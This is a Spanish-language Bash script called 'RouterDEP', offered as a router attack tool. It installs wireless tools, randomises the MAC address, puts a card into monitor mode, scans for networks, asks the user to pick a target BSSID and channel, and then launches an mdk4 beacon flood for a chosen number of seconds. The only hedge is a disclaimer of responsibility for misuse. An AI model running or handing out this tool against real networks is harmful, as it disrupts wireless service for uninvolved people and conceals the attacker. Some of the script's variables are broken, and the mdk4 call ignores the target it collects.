#!/bin/bash

redColour='\e[1;31m'
cyanColour='\033[36m'
orangeColour='\e[33m'
greenColour='\e[0;32m\033[1m'


export DEBIAN_FRONTEND=noninteractive

trap ctrl_c INT

function ctrl_c(){
        echo -e "\n\n${redColour}[!] Saliendo..."
        tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1
        rm Captura* 2>/dev/null
        exit 0
}
if [ "$(id -u)" != "0" ] > /dev/null 2>&1; then
echo -e "\n\n${redColour}[!] NO SE DETECTO ACESSO ROOT :(" 1>&2
exit
fi
clear
echo -e "$orangeColour---------------------------------------------------------------------------------------------"
echo -e "$cyanColour                                      ATAQUE ROUTER "
echo -e "$orangeColour---------------------------------------------------------------------------------------------"
echo -e "${redColour}NO ME HAGO RESPONSABLE DEL MAL USO"

if which airmon-ng >/dev/null; then
                sleep 1.0
         echo -e "$cyanColour[✔]$orangeColour[Airmon-ng]...............$greenColour[!DETECTADO! ]"
else
                sleep 1.0
         echo -e "$redColour[!]$orangeColour[Airmon-ng]...............$redColour[!NO DETECTADO! ]"
                                        sleep 1
                                        echo -e "$cyanColour[*][Instalando Airmon-ng...]"
sudo apt-get install -y airmon-ng > /dev/null
fi
if which mdk4 >/dev/null; then
                sleep 1.0
         echo -e "$cyanColour[✔]$orangeColour[MDK4]...............$greenColour[!DETECTADO! ]"
else
                sleep 1.0
         echo -e "$redColour[!]$orangeColour[MDK4]...............$redColour[!NO DETECTADO! ]"
                sleep 1.0
                echo -e "$redColour[!]NO SE PUEDE INSTALAR AUTOMATICAMENTE :("
fi
if which macchanger >/dev/null; then
                sleep 1.0
         echo -e "$cyanColour[✔]$orangeColour[MACCHANGER]...............$greenColour[!DETECTADO! ]"
                sleep 1.0
else
         echo -e "$redColour[!]$orangeColour[MACCHANGER]...............$redColour[!NO DETECTADO! ]"
                sleep 1.0
                echo -e "$cyanColour[*][Instalando MACCHANGER...]"
sudo apt-get install -y macchanger >/dev/null
fi
sleep 1.5
clear
echo -e "$orangeColour---------------------------------------------------------------------------------------------"
echo -e "$cyanColour                                      RouterDEP "
echo -e "$orangeColour---------------------------------------------------------------------------------------------"
echo ""
echo -e "${orangeColour}Creador:$cyanColour Juan Olmo "
echo -e "${orangeColour}GitHub:$cyanColour Juan3817381 "
echo -e "${orangeColour}---------------------------------------------------------------------------------------------"
echo "
[1] Poner en modo monitor

[2] Salir

"
read -p"Elige una Opcion: "

if [[ $REPLY =~ ^[1-2]$ ]]; then
    if [[ $REPLY == 2 ]]; then
        echo "$redColour Saliendo..."
clear
        exit
fi
if [[ $REPLY == 1 ]]; then
echo -e "$cyanColour"
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
        echo -e "$white"
        read -p "Cual targeta red quieres poner en modo monitor: " interface
ifconfig $interface down
        echo -e  "$orangeColour"
macchanger -r $interface
ifconfig $interface up
airmon-ng start $interface
pkill dhclient && pkill wpa_supplicant
echo -e "$orangeColour Modo:$cyanColour MONITOR "
sleep 3.0
clear


echo -e "$orangeColour---------------------------------------------------------------------------------------------"
echo -e "$cyanColour                                     ATAQUE RouterDEP "
echo -e "$orangeColour---------------------------------------------------------------------------------------------"
echo "

[1] ataque a router con MDK4

[2] Salir
"
read -p "Elige una Opcion: "

if [[ $REPLY =~ ^[1-2]$ ]]; then
    if [[ $REPLY == 2 ]]; then
        echo "$redColour Saliendo..."
airmon-ng stop $interface$mon
clear
        exit
    fi
    if [[ $REPLY == 1 ]]; then
echo -e "$redColour Escaneando REDES para ATACAR"
sleep 1.0
echo -e "$redColour ESPERE 10 SEGUNDOS EN EL ESCANEO"
sleep 3.0
timeout --foreground 10s airodump-ng $interface$mon
echo
echo
printf "$orangeColour Escribe el$cyanColour BSSID$orangeColour del la red del objetivo: "
read bssid
printf "$orangeColour Escribe el canal del objetivo$cyanColour(ch): "
read ch
printf "$orangeColour Escribe esto$cyanColour(txt)$orangeColour para guardar el $cyanColour BSSID$orangeColour del objetivo: "
read doc
echo $bssid > $doc
printf "$orangeColour Añade la $cyanColour duracion$orangeColour del$cyanColour ataque$orangeColour en segundos: "
read sec
sleep 2.5
echo -e "$redColour EL ATAQUE SERA ENVISDO AL BSSID DEL OBJETIVO:$cyanColour $bssid $cyanColour EN EL CANAL: $ch"
sleep 1.5
echo -e "$redColour ENVIANDO ATAQUE AL OBJETIVO...$cyanColour TIEMPO ASIGNADO:$cyanColour $sec$cyanColour Segundos $nc"
timeout --foreground $sec$s xterm -T "ATACANDO" -geometry 100x30 -e mdk4 $interface$mon b
echo -e "$nc($orangeColour*$nc)$cyanColour ATAQUE FINALIZADO...$cyanColour"
sleep 3.0
echo -e "$nc($orangeColour*$nc)$cyanColour Volviendo a modo manager$cyanColour"
sleep 2.5
airmon-ng stop $interface$mon
sleep 3.0
bash routerdep.sh


    fi
else
    echo "Entrada incorrecta." >&2
    exit 1
fi



    fi
else
    echo "Entrada incorrecta." >&2
    exit 1
fi


